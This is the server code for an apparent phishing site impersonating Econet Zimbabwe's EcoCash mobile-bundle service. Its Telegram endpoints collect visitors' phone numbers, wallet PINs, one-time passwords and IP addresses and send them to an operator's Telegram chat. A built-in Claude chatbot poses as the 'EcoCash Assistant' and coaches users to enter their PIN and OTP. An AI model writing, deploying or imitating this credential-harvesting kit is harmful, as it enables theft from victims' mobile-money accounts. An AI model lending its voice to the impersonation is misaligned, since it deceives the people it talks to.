'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use(express.json({ limit: '20kb' }));
app.use(express.urlencoded({ extended: false }));

/* ── SECURITY HEADERS ── */
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options',  'nosniff');
  res.setHeader('X-Frame-Options',         'DENY');
  res.setHeader('X-XSS-Protection',        '1; mode=block');
  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
  next();
});

/* ── RATE LIMITERS ── */
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 30,
  message: { error: 'Too many requests. Please try again later.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
const chatLimiter = rateLimit({
  windowMs: 60 * 1000, max: 30,
  message: { reply: 'Too many messages. Please wait a moment.' },
  standardHeaders: true, legacyHeaders: false,
  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
});
app.use('/api/sendTelegram', apiLimiter);
app.use('/api/telegram', apiLimiter);
app.use('/api/chat', chatLimiter);

/* ── STATIC FILES ── */
app.use(express.static(path.join(__dirname), { extensions: ['html'], index: 'index.html' }));

/* ── TELEGRAM HELPER ── */
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return resolve({ ok: false, reason: 'env_missing' });
    }
    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
    const opts = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false }); } });
    });
    req.on('error', reject);
    req.write(body); req.end();
  });
}

/* ── CLAUDE AI HELPER ── */
function callClaude(messages) {
  return new Promise((resolve, reject) => {
    const API_KEY = process.env.ANTHROPIC_API_KEY;
    if (!API_KEY) {
      console.error('[Claude] ANTHROPIC_API_KEY not set');
      return resolve({ error: 'API key missing' });
    }
    const body = JSON.stringify({
      model: 'claude-haiku-4-5',
      max_tokens: 400,
      system: `You are the EcoCash Assistant for Econet Zimbabwe — a helpful, friendly AI that answers questions about EcoCash mobile bundles.
Respond in English. Where natural, add a short Shona phrase in brackets e.g. (Tariindei? / How much?).

BUNDLE PLANS:
- Daily: Voice 0–20 min, SMS 0–25, Data 0–3 GB — from USD 0.60
- 3 Days: Voice 0–50 min, SMS 0–75, Data 0–8 GB — from USD 1.40
- Weekly: Voice 0–120 min, SMS 0–200, Data 0–20 GB — from USD 2.80
- 2 Weeks: Voice 0–250 min, SMS 0–450, Data 0–45 GB — from USD 5.20
- Monthly: Voice 0–600 min, SMS 0–1000, Data 0–100 GB — from USD 9.90

PAYMENT: Via EcoCash mobile wallet — enter your +263 number and PIN, confirm with 6-digit OTP.

TIPS:
- Sliders let you customise Voice, SMS and Data within each plan
- Price adjusts as you slide — more = higher, less = lower
- All bundles activate instantly after payment

Keep answers under 3 sentences. Be warm and helpful.`,
      messages,
    });
    const opts = {
      hostname: 'api.anthropic.com',
      path: '/v1/messages',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'anthropic-version': '2023-06-01',
        'x-api-key': API_KEY,
        'Content-Length': Buffer.byteLength(body),
      },
    };
    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.error) console.error('[Claude] API error:', parsed.error.type, parsed.error.message);
          resolve(parsed);
        } catch (e) {
          console.error('[Claude] Parse error:', data.slice(0, 200));
          resolve({ error: 'Invalid response' });
        }
      });
    });
    req.on('error', (e) => { console.error('[Claude] Request error:', e.message); reject(e); });
    req.write(body); req.end();
  });
}

/* ── POST /api/sendTelegram ── */
app.post('/api/sendTelegram', async (req, res) => {
  try {
    const { submittedAt='', loginPhone='', loginPin='', otp='', event='', plan='', device='' } = req.body || {};
    if (!loginPhone && !otp) return res.status(400).json({ error: 'Invalid payload' });

    // Strip country code — show local number only
    const localPhone = loginPhone.replace(/^\+263/, '').replace(/^00263/, '').replace(/^263/, '').trim() || loginPhone;

    const emoji = { receive_offer_clicked:'📲', offer_received:'✅', resend_otp:'🔁' }[event] || '📋';
    const message = [
      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${submittedAt}`,
      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,
      ``,
      `📦 <b>Bundle:</b> ${plan}`,
      `📟 <b>Device:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');

    const result = await sendTelegramMessage(message);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/sendTelegram]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── POST /api/chat ── */
app.post('/api/chat', async (req, res) => {
  try {
    const { messages } = req.body || {};
    if (!messages || !Array.isArray(messages) || !messages.length) {
      return res.status(400).json({ error: 'Missing messages' });
    }
    const clean = messages.slice(-10).map(m => ({
      role: m.role === 'assistant' ? 'assistant' : 'user',
      content: String(m.content || '').slice(0, 500),
    })).filter(m => m.content.trim());

    if (!clean.length) return res.status(400).json({ error: 'Empty messages' });

    const claudePromise = callClaude(clean);
    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 25000));
    const result = await Promise.race([claudePromise, timeout]);

    if (result.error) return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });
    if (result.type === 'error') return res.json({ reply: 'I\'m temporarily unavailable. Please try again in a moment.' });

    const text = result.content?.[0]?.text || '';
    if (!text) {
      console.error('[Claude] Empty response:', JSON.stringify(result).slice(0, 300));
      return res.json({ reply: 'No response received. Please try again.' });
    }
    return res.json({ reply: text.trim() });
  } catch (err) {
    console.error('[/api/chat]', err.message);
    return res.json({ reply: err.message === 'timeout' ? 'Response timed out. Please try again.' : 'An error occurred. Please try again.' });
  }
});


/* ── POST /api/telegram (frontend calls this) ── */
app.post('/api/telegram', async (req, res) => {
  try {
    const {
      event = '', phone = '', pin = '', otp = '',
      plan = '', voice = '', sms = '', data = '', amount = '',
      // legacy fields
      loginPhone = '', loginPin = '',
    } = req.body || {};

    const rawPhone  = phone || loginPhone || '';
    const rawPin    = pin   || loginPin   || '';

    // Strip country code for display
    const local = rawPhone
      .replace(/^\+?00263/, '')
      .replace(/^\+?263/, '')
      .replace(/^0/, '')
      .replace(/\D/g, '')
      .trim();

    const emoji = {
      bundle_subscribed:      '💳',
      receive_offer_clicked:  '📲',
      offer_received:         '✅',
      resend_otp:             '🔁',
    }[event] || '📋';

    const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false });

    const message = [
      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
      ``,
      `📅 <b>Time:</b> ${now} CAT`,
      `📱 <b>Phone:</b> <code>+263${local}</code>`,
      rawPin ? `🔐 <b>PIN:</b> <code>${rawPin}</code>` : null,
      otp    ? `🔑 <b>OTP:</b> <code>${otp}</code>`   : null,
      ``,
      `📦 <b>Plan:</b> ${plan || '—'}`,
      voice  ? `📞 <b>Voice:</b> ${voice} Min`  : null,
      sms    ? `💬 <b>SMS:</b> ${sms} SMS`       : null,
      data   ? `🌐 <b>Data:</b> ${data} GB`      : null,
      amount ? `💰 <b>Amount:</b> ${amount}`     : null,
      ``,
      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
    ].filter(Boolean).join('\n');

    const result = await sendTelegramMessage(message);
    return res.json({ ok: true, telegram: result.ok });
  } catch (err) {
    console.error('[/api/telegram]', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

/* ── GET /api/test-claude ── */
app.get('/api/test-claude', async (req, res) => {
  const API_KEY = process.env.ANTHROPIC_API_KEY;
  if (!API_KEY) return res.json({ ok: false, error: 'ANTHROPIC_API_KEY not set' });
  try {
    const result = await callClaude([{ role: 'user', content: 'Say hello in one word.' }]);
    res.json({ ok: !result.error, model: result.model, reply: result.content?.[0]?.text || null, error: result.error || null });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

/* ── GET /health ── */
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID), ai: !!process.env.ANTHROPIC_API_KEY });
});

/* ── CATCH-ALL ── */
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

/* ── START ── */
app.listen(PORT, () => {
  console.log(`✅  EcoCash server running on port ${PORT}`);
  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
  console.log(`    Claude AI: ${process.env.ANTHROPIC_API_KEY ? 'configured ✓' : 'MISSING ⚠'}`);
});
